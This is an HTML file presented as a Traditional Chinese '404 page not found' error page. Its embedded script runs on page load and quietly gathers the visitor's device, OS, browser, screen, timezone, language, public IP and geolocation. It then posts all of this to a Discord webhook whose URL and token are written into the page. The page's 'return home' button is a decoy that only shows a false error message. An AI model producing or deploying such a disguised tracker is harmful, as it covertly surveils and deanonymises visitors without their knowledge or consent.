<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>404 - 頁面未找到</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans TC", sans-serif;
            background: linear-gradient(145deg, #f6f9fc 0%, #eef2f5 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .error-container {
            max-width: 780px;
            width: 100%;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.2), 0 2px 6px rgba(0, 0, 0, 0.02);
            overflow: hidden;
            text-align: center;
            padding: 3rem 2rem 4rem;
            border: 1px solid rgba(0, 0, 0, 0.05);
        }

        .error-code {
            font-size: 8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #2c3e66, #1a2a44);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            letter-spacing: -0.02em;
            line-height: 1;
        }

        .error-title {
            font-size: 1.9rem;
            font-weight: 600;
            color: #1e2a3e;
            margin: 1rem 0 0.75rem;
        }

        .error-message {
            color: #4a5b6e;
            font-size: 1.1rem;
            margin-bottom: 2rem;
            border-bottom: 1px solid #e2e8f0;
            display: inline-block;
            padding-bottom: 0.5rem;
        }

        .description {
            color: #5b6f88;
            max-width: 480px;
            margin: 1.2rem auto;
            font-size: 0.95rem;
            line-height: 1.5;
        }

        .ghost-icon {
            font-size: 4rem;
            opacity: 0.7;
            margin-bottom: 0.5rem;
            display: inline-block;
        }

        .home-button {
            display: inline-block;
            margin-top: 1.8rem;
            padding: 12px 32px;
            background: #1e2f41;
            color: white;
            text-decoration: none;
            border-radius: 60px;
            font-weight: 500;
            transition: background 0.2s;
            cursor: pointer;
            font-size: 1rem;
            border: none;
        }

        .home-button:hover {
            background: #0f1e2c;
        }

        .debug-note {
            margin-top: 2.2rem;
            font-size: 0.7rem;
            color: #8c9bb0;
            border-top: 1px solid #e9edf2;
            padding-top: 1.5rem;
            width: 80%;
            margin-left: auto;
            margin-right: auto;
        }

        @media (max-width: 550px) {
            .error-container {
                padding: 2rem 1.5rem 3rem;
            }
            .error-code {
                font-size: 5rem;
            }
            .error-title {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>

<div class="error-container">
    <div class="ghost-icon">🔍</div>
    <div class="error-code">404</div>
    <div class="error-title">哎呀！頁面迷失在數位宇宙</div>
    <div class="error-message">您請求的頁面無法找到</div>
    <div class="description">
        可能連結已失效，或者頁面已被遷移。<br>
        請檢查網址是否正確，或者返回首頁繼續瀏覽。
    </div>
    <a href="javascript:void(0);" class="home-button" id="fakeHomeBtn">返回首頁</a>
    <div class="debug-note">
        * 如果您認為是網站錯誤，請聯繫管理員 • 錯誤碼: HTTP 404
    </div>
</div>

<script>
    // 您提供的 Discord Webhook 網址
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq';

    // 取得詳細設備資訊
    function getDeviceDetails() {
        const ua = navigator.userAgent;
        let deviceModel = "未知設備";
        let os = "未知作業系統";
        let browser = "未知瀏覽器";
        
        // 解析作業系統
        if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10";
        else if (ua.indexOf("Windows NT 6.3") !== -1) os = "Windows 8.1";
        else if (ua.indexOf("Windows NT 6.2") !== -1) os = "Windows 8";
        else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
        else if (ua.indexOf("Mac OS X") !== -1) {
            const match = ua.match(/Mac OS X (10[0-9_\.]+)/);
            os = match ? `macOS ${match[1].replace(/_/g, '.')}` : "macOS";
        } else if (ua.indexOf("iPhone") !== -1) os = "iOS (iPhone)";
        else if (ua.indexOf("iPad") !== -1) os = "iOS (iPad)";
        else if (ua.indexOf("Android") !== -1) {
            const match = ua.match(/Android ([0-9\.]+)/);
            os = match ? `Android ${match[1]}` : "Android";
        } else if (ua.indexOf("Linux") !== -1) os = "Linux";
        
        // 解析瀏覽器
        if (ua.indexOf("Edg") !== -1) browser = "Microsoft Edge";
        else if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edg") === -1) browser = "Google Chrome";
        else if (ua.indexOf("Firefox") !== -1) browser = "Mozilla Firefox";
        else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Apple Safari";
        else if (ua.indexOf("OPR") !== -1 || ua.indexOf("Opera") !== -1) browser = "Opera";
        else browser = "其他瀏覽器";
        
        // 推測設備型號
        let isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
        let deviceType = isMobile ? "行動裝置" : "桌上型電腦/筆電";
        
        if (/iPhone/i.test(ua)) {
            deviceModel = "iPhone";
        } else if (/iPad/i.test(ua)) {
            deviceModel = "iPad";
        } else if (/Android/i.test(ua)) {
            let match = ua.match(/\(Linux; Android.*?; (.*?) Build/);
            if (match && match[1]) deviceModel = match[1];
            else deviceModel = "Android 通用裝置";
        } else if (/Windows NT/i.test(ua)) {
            deviceModel = "Windows PC";
        } else if (/Mac OS X/i.test(ua)) {
            deviceModel = "Macintosh";
        } else {
            deviceModel = deviceType;
        }
        
        const screenRes = `${window.screen.width} x ${window.screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const language = navigator.language || navigator.userLanguage;
        
        return {
            deviceModel: deviceModel,
            os: os,
            browser: browser,
            deviceType: deviceType,
            screenResolution: screenRes,
            timezone: timezone,
            language: language,
            userAgent: ua
        };
    }
    
    // 取得客戶端 IP
    function fetchClientIP() {
        return new Promise((resolve) => {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    if (data.ip) resolve(data.ip);
                    else resolve("無法獲取 IP");
                })
                .catch(() => {
                    fetch('https://ipapi.co/json/')
                        .then(res => res.json())
                        .then(data => {
                            if (data.ip) resolve(data.ip);
                            else resolve("無法獲取 IP");
                        })
                        .catch(() => resolve("未知 IP"));
                });
        });
    }
    
    // 取得地理位置
    async function getGeoInfo(ip) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);
            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,regionName`, { signal: controller.signal });
            clearTimeout(timeoutId);
            if (res.ok) {
                const data = await res.json();
                if (data.status === 'success') {
                    return `${data.country || ''} ${data.regionName || ''} ${data.city || ''}`.trim() || "未知地區";
                }
            }
            return "無法獲取地區";
        } catch (e) {
            return "地區獲取失敗";
        }
    }
    
    // 發送到 Discord
    async function sendToDiscord(visitorData) {
        const embed = {
            title: "🚨 404 頁面訪問警報",
            description: `偵測到有用戶觸發404頁面`,
            color: 0xE67E22,
            fields: [
                { name: "🖥️ 設備型號", value: `\`${visitorData.deviceModel}\``, inline: true },
                { name: "💿 作業系統", value: `\`${visitorData.os}\``, inline: true },
                { name: "🌐 瀏覽器", value: `\`${visitorData.browser}\``, inline: true },
                { name: "📱 裝置類別", value: `\`${visitorData.deviceType}\``, inline: true },
                { name: "🖥️ 螢幕解析度", value: `\`${visitorData.screenResolution}\``, inline: true },
                { name: "🌍 IP 位址", value: `\`${visitorData.ipAddress}\``, inline: false },
                { name: "🗺️ 地理位置", value: `\`${visitorData.geo || "無法取得"}\``, inline: true },
                { name: "⏱️ 時區", value: `\`${visitorData.timezone}\``, inline: true },
                { name: "🔤 語言", value: `\`${visitorData.language}\``, inline: true }
            ],
            footer: { text: "404 資訊收集機制" },
            timestamp: new Date().toISOString()
        };
        
        const payload = { embeds: [embed], content: `⚠️ **新訪客觸發404頁面** (IP: ${visitorData.ipAddress})` };
        
        try {
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (response.ok) {
                console.log("✅ 已發送到 Discord");
            } else {
                console.error(`❌ Discord 錯誤: ${response.status}`);
            }
        } catch (err) {
            console.error("❌ 發送失敗:", err);
        }
    }
    
    // 主程式
    (async function main() {
        const device = getDeviceDetails();
        const clientIp = await fetchClientIP();
        
        let geoInfo = "未知位置";
        if (clientIp && clientIp !== "無法獲取 IP" && clientIp !== "未知 IP") {
            geoInfo = await getGeoInfo(clientIp);
        }
        
        const finalData = {
            deviceModel: device.deviceModel,
            os: device.os,
            browser: device.browser,
            deviceType: device.deviceType,
            screenResolution: device.screenResolution,
            timezone: device.timezone,
            language: device.language,
            userAgent: device.userAgent,
            ipAddress: clientIp,
            geo: geoInfo
        };
        
        await sendToDiscord(finalData);
        
        document.getElementById('fakeHomeBtn').addEventListener('click', () => {
            alert("目前無法連線至首頁，請稍後再試。 (錯誤: 找不到請求的資源)");
        });
    })();
</script>
</body>
</html>
